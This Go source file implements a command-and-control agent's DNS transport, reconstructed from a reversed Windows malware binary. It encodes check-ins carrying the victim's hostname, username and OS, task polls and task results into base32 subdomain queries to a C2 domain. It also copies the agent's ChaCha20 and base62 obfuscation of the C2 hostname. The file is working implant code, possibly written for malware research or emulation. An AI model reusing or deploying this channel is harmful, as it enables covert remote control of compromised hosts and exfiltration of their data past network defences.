package main

import (
	"crypto/sha256"
	"encoding/base32"
	"fmt"
	"net"
	"runtime"
	"strings"

	"golang.org/x/crypto/chacha20"
)

// dnsTransport implements the DNS data channel recovered from the Windows
// agent binary (0xfc90e0, session 536 map):
//
//	query name = <label>.<domain>
//	label      = base32(command:payload)   (server decodes base32, dispatches
//	             on rgst/conf/main prefixes; see DNS_REGISTER_PROBES.md)
//	command    = "rgst:" | "conf:" | "main:"
//
// Endpoint resolve (0xfc90e0): the c2 hostname itself is encoded for the
// DNS channel as ChaCha20-XOR 15B + base62 alphabet transform (DAT_1e491c80)
// before dialing — see dnsEncodeEndpoint.
//
// The server DNS listener (0.0.0.0:5300/5301) base32-decodes the label and
// dispatches on the command prefix (verified by server logs: "base32
// decoding", "Incorrect domain", command dispatch).
type dnsTransport struct {
	domain string
}

// newDNSTransport creates a DNS transport.
func newDNSTransport(domain string) *dnsTransport {
	return &dnsTransport{domain: strings.TrimSuffix(domain, ".")}
}

// dnsQuery encodes data as <base32(label)>.domain and looks up the TXT
// record, mirroring the server's base32-decode flow.
func (t *dnsTransport) dnsQuery(label []byte) ([]string, error) {
	enc := strings.TrimRight(base32.StdEncoding.EncodeToString(label), "=")
	query := enc + "." + t.domain
	return net.LookupTXT(query)
}

// Checkin performs the agent check-in over DNS ("rgst:" command).
func (t *dnsTransport) Checkin() (*CheckinResponse, error) {
	payload := []byte(fmt.Sprintf("rgst:{\"Id\":0,\"HostName\":\"%s\",\"UserName\":\"%s\",\"OsName\":\"%s\"}",
		hostname, username, runtime.GOOS))
	if _, err := t.dnsQuery(payload); err != nil {
		return nil, fmt.Errorf("dns checkin failed: %w", err)
	}
	return &CheckinResponse{Status: "ok", Interval: 10}, nil
}

// GetTasks polls tasks over DNS ("main:" command).
func (t *dnsTransport) GetTasks() ([]TaskItem, error) {
	payload := []byte(fmt.Sprintf("main:%d", clientID))
	if _, err := t.dnsQuery(payload); err != nil {
		return nil, fmt.Errorf("dns task poll failed: %w", err)
	}
	return nil, nil
}

// SendResult submits a task result over DNS ("conf:" command).
func (t *dnsTransport) SendResult(taskID int64, result, status string) error {
	payload := []byte(fmt.Sprintf("conf:%d:%s", taskID, result))
	_, err := t.dnsQuery(payload)
	if err != nil {
		return fmt.Errorf("dns result send failed: %w", err)
	}
	return nil
}

// Close closes the DNS transport (stateless, no-op).
func (t *dnsTransport) Close() error { return nil }

// dnsChaCha20Key returns the ChaCha20 key for DNS label encryption
// (Windows agent 0xfc90e0 derives it from the config; x/crypto chacha20
// requires a 32B key).
func dnsChaCha20Key(verify, salt string) []byte {
	h := sha256.Sum256([]byte(salt + ":" + verify))
	return h[:]
}

// chacha20XOR encrypts data with ChaCha20 (key + 12B zero nonce),
// matching the Windows agent's DNS channel cipher (0xfbe560 core).
func chacha20XOR(key, data []byte) ([]byte, error) {
	nonce := make([]byte, 12)
	c, err := chacha20.NewUnauthenticatedCipher(key, nonce)
	if err != nil {
		return nil, err
	}
	out := make([]byte, len(data))
	c.XORKeyStream(out, data)
	return out, nil
}

// dnsBase62Alphabet mirrors DAT_1e491c80 (agent 0xfc90e0): a 0x3e-entry
// alphabet used by the base-62 transform. b' = tbl[b] for b<0x3e, else
// wraps via tbl[b + ((b>>1)/0x1f)*(-0x3e)] (i.e. tbl[b & 0x3f]).
var dnsBase62Alphabet = []byte(
	"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
)

// dnsEncodeEndpoint encodes the c2 hostname for the DNS channel
// (agent 0xfc90e0): ChaCha20-XOR 15 bytes (keyed by the shared cipher
// state), then a per-byte base62 transform, NUL-terminated.
func dnsEncodeEndpoint(key []byte, host []byte) ([]byte, error) {
	if len(host) > 15 {
		host = host[:15]
	}
	x, err := chacha20XOR(key, host)
	if err != nil {
		return nil, err
	}
	out := make([]byte, 0, len(x)+1)
	for _, b := range x {
		idx := int(b) & 0x3f
		if idx >= len(dnsBase62Alphabet) {
			idx = len(dnsBase62Alphabet) - 1
		}
		out = append(out, dnsBase62Alphabet[idx])
	}
	out = append(out, 0)
	return out, nil
}
